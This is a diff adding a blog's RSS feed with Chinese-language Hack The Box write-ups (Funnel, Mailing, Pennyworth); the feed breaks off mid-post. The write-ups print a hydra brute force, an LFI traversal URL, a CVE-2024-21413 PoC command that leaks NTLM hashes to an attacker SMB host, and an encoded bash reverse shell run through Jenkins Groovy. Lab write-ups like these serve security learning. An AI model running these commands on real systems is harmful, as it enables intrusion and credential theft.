@@ -1,0 +1,554 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Guertena</title><description>Blog</description><link>https://s0z.me/</link><language>zh_TW</language><item><title>HTB - Funnel</title><link>https://s0z.me/posts/htb---funnel/</link><guid isPermaLink="true">https://s0z.me/posts/htb---funnel/</guid><pubDate>Tue, 14 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;HTB - Funnel&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkVBCG_JA.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PostgreSQL 指令&lt;/li&gt;
+&lt;li&gt;SSH tunnel 創建&lt;/li&gt;
+&lt;li&gt;FTP anonymose Login&lt;/li&gt;
+&lt;li&gt;hydra 暴力破解&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;:::info
+Target host  : &lt;strong&gt;10.129.288.195&lt;/strong&gt;
+nmap argment : &lt;strong&gt;nmap -sC -sV -Pn -T4 10.129.288.195&lt;/strong&gt;
+:::&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyiRs-uyC.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;觀察掃描結果可以發現 ftp-anon : Anonymous login allowed&lt;/p&gt;
+&lt;p&gt;代表說可以匿名登入該主機的ftp server&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;這邊用 get 把目錄中的文件都下載到本地
+如下圖 :
+&lt;img src=&quot;https://hackmd.io/_uploads/H1sk6bukR.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;打開下載回來兩個檔案，提供了兩個重要的資訊&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;password_policy.pdf 提到新進員工的預設密碼為 funnel123#!#&lt;/li&gt;
+&lt;li&gt;welcome_28112022 群發電子郵件列出了所有新進員工的 email&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkAf1Gu1A.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;將所有新進員工的帳號記錄下來，透過 hydra 來進行 ssh 密碼爆破
+&lt;img src=&quot;https://hackmd.io/_uploads/SkkxKfuyA.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;連進去後使用 ss -tls 查看只連接到內網的服務
+&lt;strong&gt;127.0.0.1:postgresql&lt;/strong&gt;
+&lt;strong&gt;127.0.0.1:5432&lt;/strong&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/Hy6wFf_JR.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;但是這個用戶端裡面似乎沒有安裝 psql 客戶端
+我們必須創建一個 SSH tunnel 來使用 localhost 的 client 連上去&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ssh -L 5555:localhost:5432 christine@10.129.106.134&lt;/strong&gt;
+:::success
+-L 創建通道
+5555:localhost:5432 可以很圖像化的記憶
+[5555]--[localhost]--[5432] &amp;lt;--- 就像一個通道
+:::
+&lt;img src=&quot;https://hackmd.io/_uploads/SJw2ofOkC.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;psql -U christine -h localhost -p 5555&lt;/strong&gt;
+:::success
+-U 使用者
+-h 伺服器位置 (這裡因為要通過 SSH tunnel 連到資料庫所以打 localhost)
+-p Port
+:::&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1hz2z_yR.png&quot; alt=&quot;image&quot; /&gt;
+:::success
+\l = 列出伺服器
+\c = 連結到伺服器
+\dt = 列出資料庫
+:::
+&lt;img src=&quot;https://hackmd.io/_uploads/rJyC3fdkA.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;SELECT * FROM flag; 就可以得到 flag 了&lt;/p&gt;
+</content:encoded></item><item><title>HTB - Mailing</title><link>https://s0z.me/posts/htb---mailing/</link><guid isPermaLink="true">https://s0z.me/posts/htb---mailing/</guid><pubDate>Tue, 14 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;HTB - Mailing&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1b4afhfA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Target IP : &lt;code&gt;10.129.231.35&lt;/code&gt;
+Target OS : &lt;code&gt;Windows&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;user.txt&lt;/h2&gt;
+&lt;h3&gt;nmap enumerate&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;
+PORT      STATE SERVICE       REASON  VERSION
+25/tcp    open  smtp          syn-ack hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+110/tcp   open  pop3          syn-ack hMailServer pop3d
+|_pop3-capabilities: TOP UIDL USER
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+143/tcp   open  imap          syn-ack hMailServer imapd
+|_imap-capabilities: IMAP4 SORT IDLE completed CHILDREN CAPABILITY IMAP4rev1 ACL OK QUOTA RIGHTS=texkA0001 NAMESPACE
+445/tcp   open  microsoft-ds? syn-ack
+465/tcp   open  ssl/smtp      syn-ack hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+587/tcp   open  smtp          syn-ack hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+993/tcp   open  ssl/imap      syn-ack hMailServer imapd
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: IMAP4 SORT IDLE completed CHILDREN CAPABILITY IMAP4rev1 ACL OK QUOTA RIGHTS=texkA0001 NAMESPACE
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+5040/tcp  open  unknown       syn-ack
+7680/tcp  open  pando-pub?    syn-ack
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+57635/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 34873/tcp): CLEAN (Timeout)
+|   Check 2 (port 45168/tcp): CLEAN (Timeout)
+|   Check 3 (port 25500/udp): CLEAN (Timeout)
+|   Check 4 (port 41457/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-10T22:19:36
+|_  start_date: N/A
+|_clock-skew: 2s
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;老樣子，先做域名對應&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJVtRz2fA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;LFI ( Local File Inclusion )&lt;/h3&gt;
+&lt;p&gt;進到網站頁面，似乎沒啥功能只是介紹這個軟體&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1V9JmnGC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;看到一個有趣的東西&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJk2173zR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;看到 php 又看到直接引用檔案 , 很容易就聯想到 LFI&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJKllmnf0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;確認一次 , 確實有這個漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJtSxX2zA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;由於不知道檔案路徑可以用的地方在哪裡 , 所以先安裝 hMail&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1ikzXnGR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;找到一個資料夾底下的 .INI 似乎是伺服器的設定檔&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJVszX3GA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;於是乎用剛剛的漏洞嘗試能不能從伺服器扒下來&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sk6lXQnfR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkAfXQhGC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;分析一下是administrator的密碼是哪種Hash&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyhwXQnGR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;用 hashcat 跑出來的結果為&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;密碼感覺跟資料庫有關係 , 依照安裝在local的伺服器得知資料庫的位置 , 所以&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://mailing.htb/download.php?file=..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Database\hMailServer.sdf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;好像是特定格式的資料庫 , 經一番搜索後找到一個 windows 的程式可以開啟&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S19PL72GC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;好吧... 輸入剛剛的密碼也不管用 , 去查一下他要怎麼解密&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SybTUXhMR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;找到一則很有用的文章 , 大致上來說就是&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;找解密用vbs&lt;/li&gt;
+&lt;li&gt;輸入密碼&lt;/li&gt;
+&lt;li&gt;輸入 [Database] 底下的 hash&lt;/li&gt;
+&lt;li&gt;得到解密用密碼&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryRDwm2MA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;經上述步驟 , 得到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1A6wm3MC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;解密後&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk_Xd73zA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJf1t72zC.png&quot; alt=&quot;圖片&quot; /&gt;
+似乎這的資料庫沒有直接紀錄信件訊息
+而是只有儲存信件的名稱 , 於是乎準備去 google 相關路徑&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkR337hfA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C:\Program Files\hMailserver\Data\domain.dom\user\E6\{E6..restoffilename}.EML&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;不過 , 資料庫裡面的都是發信者的帳號 , 只有四個用戶組所以我想可以慢慢猜&lt;/p&gt;
+&lt;p&gt;經過一番嘗試後隨便找一封信下載下來
+&lt;code&gt;http://mailing.htb/download.php?file=..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Data\mailing.htb\maya\6E\{6E5EE719-D1E3-4DDD-A019-3787CC5C137F}.eml&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;CVE-2024-21413&lt;/h3&gt;
+&lt;p&gt;結果是一封超像釣魚的信,而且還是管理員寄過來的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyhmCm2MC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;底部有一個&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByCF1E3fC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;依照提示找到一個專案工具
+&lt;a href=&quot;https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;大意是說 , 有個漏洞你只要閱覽郵件就會自動讀取裡面的 url
+用來劫持 NTLM 之類的&lt;/p&gt;
+&lt;p&gt;先來開個 responder&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo responder -I tun0 -w -d
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;執行poc腳本&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python CVE-2024-21413.py --server 10.129.231.35 --port 587 --username &quot;administrator@mailing.htb&quot; --password &quot;homenetworkingadministrator&quot; --sender &quot;administrator@mailing.htb&quot; --recipient &quot;maya@mailing.htb&quot; --url &apos;\\10.10.16.26\smb\hello&apos; --subject &quot;You are fire&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;s&gt;然後甚麼事情都沒發生&lt;/s&gt;
+其實是這個 poc 還是要使用者點開郵件才能觸發的
+所以我們要等使用者點開這個郵件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJvE_P2GC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;等了至少一小時 , 期間去玩其他CTF&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;之後拿去跑 hashcat&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1Q1Fv2zR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;密碼是 &lt;code&gt;m4y4ngs4ri&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接者直接連上去&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;evil-winrm -i 10.129.43.97 -u &apos;maya&apos; -p &apos;m4y4ngs4ri&apos;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJ3zcv3MC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>HTB - Pennyworth</title><link>https://s0z.me/posts/htb---pennyworth/</link><guid isPermaLink="true">https://s0z.me/posts/htb---pennyworth/</guid><pubDate>Tue, 14 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;HTB - Pennyworth&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJahgPcgC.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;使用知識&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;弱口令&lt;/li&gt;
+&lt;li&gt;Jenkins&lt;/li&gt;
+&lt;li&gt;Groovy腳本&lt;/li&gt;
+&lt;li&gt;Reverse Shell&lt;/li&gt;
+&lt;li&gt;Google (?)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;過程&lt;/h2&gt;
+&lt;p&gt;1.先掃主機Port&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rustscan -a {target ip}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;rustscan 掃描端口速度非常快
+但不是nmap的替代方案,只是快速的發現開啟的Port
+可以使用 rustscan -a {target ip} -- {nmap argment}來做更細微的操作&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;2.發現&lt;code&gt;8080&lt;/code&gt;port開啟之後,直接開瀏覽器連入
+&lt;img src=&quot;https://hackmd.io/_uploads/B1JKfvcl0.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;3.Google 查看 Jenkins 是否有預設密碼是管理者未改變的
+&lt;code&gt;root:password&lt;/code&gt;直接進入後台
+&lt;img src=&quot;https://hackmd.io/_uploads/rk0aGDqeR.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;p.s 我以為這邊要練習hydra之類的暴力破解工具,沒想到那麼簡單
+不愧是 very easy&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;4.進入&lt;code&gt;http://{target ip}:8080/script&lt;/code&gt;來輸入Groovy腳本
+我在&lt;a href=&quot;https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script&quot;&gt;Hacktricks&lt;/a&gt;找到一個 Reverse Shell的腳本
+先測試作業系統&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def process = &quot;PowerShell.exe &amp;lt;WHATEVER&amp;gt;&quot;.execute()
+println &quot;Found text ${process.text}&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;報錯了,所以系統應該是Linux,這邊準備Linux用的Reverse Shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = &apos;bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}&apos;.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println &quot;out&amp;gt; $sout err&amp;gt; $serr&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
